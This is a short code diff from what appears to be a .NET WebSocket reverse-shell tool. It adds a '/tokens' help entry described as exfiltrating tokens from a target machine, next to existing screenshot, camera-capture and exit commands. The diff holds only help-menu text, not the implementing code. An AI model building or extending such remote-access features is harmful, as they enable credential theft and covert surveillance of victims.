@@ -53,6 +53,9 @@ namespace WebSocketReverseShellDotNet.service.commands
                 new HelpCommand("/screenshot", "take screen shot",
             "NA", "/screenshot"),
 
+                                new HelpCommand("/tokens", "Exfilterate tokens from target machine",
+            "NA", "/tokens"),
+
                 new HelpCommand("/camerashot", "take camera shot",
             "NA", "/camerashot"),
                 new HelpCommand("/exit", "Terminate shell",
